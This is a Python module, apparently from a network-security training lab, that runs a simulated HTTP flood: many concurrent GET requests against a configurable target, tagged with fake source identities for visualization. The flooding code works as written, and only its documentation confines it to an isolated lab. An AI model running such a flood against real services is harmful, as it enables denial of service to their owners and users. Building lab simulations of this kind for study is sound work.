"""HTTP flood attack simulation module.

Opens many concurrent HTTP requests against a target inside the isolated
lab network (attacker_net/target_net only -- see docker-compose.yml). Each
request is tagged with a synthetic fake-source identity for visualization.
"""
import argparse
import asyncio
import os
import time

import aiohttp

from common.identity import random_fake_identity
from common.metrics import ACTIVE_WORKERS, ERRORS, REQUESTS_SENT, serve_metrics
from common.recorder import Recorder, SimEvent

ATTACK_TYPE = "http_flood"


async def worker(session: aiohttp.ClientSession, target_url: str, recorder: Recorder, stop_at: float):
    identity = random_fake_identity()
    while time.time() < stop_at:
        start = time.perf_counter()
        status = None
        try:
            async with session.get(target_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                status = resp.status
                await resp.read()
        except Exception:
            ERRORS.labels(attack_type=ATTACK_TYPE, target=target_url).inc()
        latency_ms = (time.perf_counter() - start) * 1000
        REQUESTS_SENT.labels(attack_type=ATTACK_TYPE, target=target_url).inc()
        recorder.record(
            SimEvent(
                ts=time.time(),
                attack_type=ATTACK_TYPE,
                target=target_url,
                fake_ip=identity.fake_ip,
                city=identity.city,
                lat=identity.lat,
                lon=identity.lon,
                status=status,
                latency_ms=latency_ms,
            )
        )


async def run(target_url: str, concurrency: int, duration: int, run_name: str):
    recorder = Recorder(run_name)
    stop_at = time.time() + duration
    ACTIVE_WORKERS.labels(attack_type=ATTACK_TYPE).set(concurrency)
    connector = aiohttp.TCPConnector(limit=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        await asyncio.gather(*[worker(session, target_url, recorder, stop_at) for _ in range(concurrency)])
    ACTIVE_WORKERS.labels(attack_type=ATTACK_TYPE).set(0)
    recorder.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SENTINEL LAB: HTTP flood simulation")
    parser.add_argument("--target", default=os.environ.get("TARGET_URL", "http://web:8000/"))
    parser.add_argument("--concurrency", type=int, default=int(os.environ.get("CONCURRENCY", "50")))
    parser.add_argument("--duration", type=int, default=int(os.environ.get("DURATION", "60")))
    parser.add_argument("--run-name", default=os.environ.get("RUN_NAME", f"http_flood_{int(time.time())}"))
    parser.add_argument("--metrics-port", type=int, default=int(os.environ.get("METRICS_PORT", "9400")))
    args = parser.parse_args()

    serve_metrics(args.metrics_port)
    asyncio.run(run(args.target, args.concurrency, args.duration, args.run_name))
